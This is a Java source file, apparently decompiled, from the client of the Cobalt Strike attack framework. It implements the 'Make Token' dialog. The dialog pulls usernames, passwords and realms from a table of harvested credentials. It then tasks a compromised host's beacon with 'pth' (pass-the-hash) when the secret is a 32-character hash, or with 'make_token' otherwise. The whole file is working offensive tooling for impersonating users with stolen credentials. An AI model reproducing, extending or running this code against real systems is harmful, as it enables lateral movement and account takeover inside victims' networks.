package aggressor.dialogs;

import aggressor.AggressorClient;
import aggressor.browsers.Credentials;
import beacon.TaskBeacon;
import dialog.DialogListener;
import dialog.DialogManager;
import dialog.DialogUtils;
import java.awt.event.ActionEvent;
import java.util.Map;
import javax.swing.JButton;
import javax.swing.JComponent;
import javax.swing.JFrame;
import javax.swing.event.ListSelectionEvent;
import javax.swing.event.ListSelectionListener;
import ui.ATextField;

public class MakeTokenDialog implements DialogListener, ListSelectionListener {
   protected JFrame dialog = null;
   protected AggressorClient client = null;
   protected String bid = null;
   protected ATextField user;
   protected ATextField pass;
   protected ATextField domain;
   protected Credentials browser;

   public MakeTokenDialog(AggressorClient var1, String var2) {
      this.client = var1;
      this.bid = var2;
      this.browser = new Credentials(var1);
      this.browser.setColumns("user, password, realm, note");
   }

   public void dialogAction(ActionEvent var1, Map var2) {
      TaskBeacon var3 = new TaskBeacon(this.client, this.client.getData(), this.client.getConnection(), new String[]{this.bid});
      DialogUtils.openOrActivate(this.client, this.bid);
      var3.input("rev2self");
      var3.Rev2Self();
      String var4 = this.domain.getText();
      if ("".equals(var4)) {
         var4 = ".";
      }

      if (this.pass.getText().length() == 32) {
         var3.input("pth " + var4 + "\\" + this.user.getText() + " " + this.pass.getText());
         var3.PassTheHash(var4, this.user.getText(), this.pass.getText());
      } else {
         var3.input("make_token " + var4 + "\\" + this.user.getText() + " " + this.pass.getText());
         var3.LoginUser(var4, this.user.getText(), this.pass.getText());
      }

   }

   public void valueChanged(ListSelectionEvent var1) {
      if (!var1.getValueIsAdjusting()) {
         this.user.setText((String)this.browser.getSelectedValueFromColumn("user"));
         this.pass.setText((String)this.browser.getSelectedValueFromColumn("password"));
         this.domain.setText((String)this.browser.getSelectedValueFromColumn("realm"));
      }
   }

   public void show() {
      this.dialog = DialogUtils.dialog("Make Token", 580, 315);
      this.dialog.addWindowListener(this.browser.onclose());
      DialogManager var1 = new DialogManager(this.dialog);
      var1.addDialogListener(this);
      JComponent var2 = this.browser.getContent();
      this.browser.getTable().getSelectionModel().addListSelectionListener(this);
      this.user = (ATextField)var1.text("user", "User:", 36).get(1);
      this.pass = (ATextField)var1.text("pass", "Password:", 36).get(1);
      this.domain = (ATextField)var1.text("domain", "Domain:", 36).get(1);
      JButton var3 = var1.action("Build");
      JButton var4 = var1.help("https://www.cobaltstrike.com/help-make-token");
      this.dialog.add(var2, "Center");
      this.dialog.add(DialogUtils.stackTwo(var1.layout(), DialogUtils.center(var3, var4)), "South");
      this.dialog.setVisible(true);
   }
}
